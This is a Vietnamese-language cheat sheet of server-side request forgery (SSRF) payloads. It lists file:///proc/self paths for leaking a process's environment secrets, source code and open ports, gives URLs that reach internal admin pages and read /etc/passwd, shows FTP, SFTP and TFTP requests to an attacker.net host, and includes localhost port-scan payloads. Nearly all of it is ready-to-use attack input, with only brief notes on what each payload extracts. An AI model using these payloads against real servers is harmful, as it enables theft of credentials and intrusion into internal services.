# Wordlist SSRF với /proc/self
```
image=file:///proc/self/cmdline&size=large
image=file:///proc/self/environ&size=large
image=file:///proc/self/cwd/&size=large
image=file:///proc/self/cwd/package.json&size=large
image=file:///proc/self/cwd/src/index.js&size=large
image=file:///proc/self/cwd/src/routes/index.js&size=large
image=file:///proc/self/cwd/src/routes/v2/orders.js&size=large
image=file:///proc/self/fd/0&size=large
image=file:///proc/self/fd/1&size=large
image=file:///proc/self/fd/2&size=large
image=file:///proc/self/maps&size=large
image=file:///proc/self/mounts&size=large
image=file:///proc/self/status&size=large
image=file:///proc/self/net/tcp&size=large
image=file:///proc/self/net/tcp6&size=large
image=file:///proc/self/net/udp&size=large
image=file:///proc/self/net/udp6&size=large

```
📌 Ý nghĩa từng payload

cmdline → biết app start bằng file nào (node /usr/app/src/index.js).

environ → lấy ENV (JWT_SECRET, DB_PASS, có thể cả FLAG).

cwd → current working dir (truy cập source code trực tiếp).

fd/0, fd/1, fd/2 → stdin, stdout, stderr của process.

maps, mounts, status → thông tin tiến trình & hệ thống (dò cấu hình).

net/tcp, udp → cổng đang mở (xác định PORT để SSRF gọi nội bộ).

# Truy cập các trang nội bộ

Một số cách khai thác phổ biến để truy cập vào các trang nội bộ bao gồm:
```
https://target.com/page?url=http://127.0.0.1/admin
https://target.com/page?url=http://127.0.0.1/phpmyadmin
https://target.com/page?url=http://127.0.0.1/pgadmin
https://target.com/page?url=http://127.0.0.1/any_interesting_page
```
# Truy cập các tệp nội bộ thông qua lược đồ URL

Tấn công vào lược đồ URL cho phép kẻ tấn công lấy tệp từ máy chủ và tấn công các dịch vụ nội bộ.

Một số cách khai thác phổ biến để truy cập các tệp tin nội bộ bao gồm:
```
https://target.com/page?url=file://etc/passwd
https://target.com/page?url=file:///etc/passwd
https://target.com/page?url=file:////etc/passwd
https://target.com/page?url=file://path/to/file
```
# Truy cập Dịch vụ Nội bộ thông qua Sơ đồ URL

Bạn có thể sử dụng lược đồ URL để kết nối với một số dịch vụ nhất định.

Đối với giao thức truyền tệp:

```
https://target.com/page?url=ftp://attacker.net:11211/
https://target.com/page?url=sftp://attacker.net:11111/
https://target.com/page?url=tftp://attacker.net:123456/TESTUDP
```
#2. XSPA—Quét cổng trên máy chủ
Tấn công Cổng Chéo Trang (XSPA) là một loại SSRF trong đó kẻ tấn công có thể quét máy chủ để tìm các cổng đang mở. Điều này thường được thực hiện bằng cách sử dụng giao diện vòng lặp trên máy chủ (127.0.0.1 hoặc localhost) kết hợp với cổng đang được quét (21, 22, 25…).

```
https://target.com/page?url=http://localhost:22/
https://target.com/page?url=http://127.0.0.1:25/
https://target.com/page?url=http://127.0.0.1:3389/
https://target.com/page?url=http://localhost:PORT/
```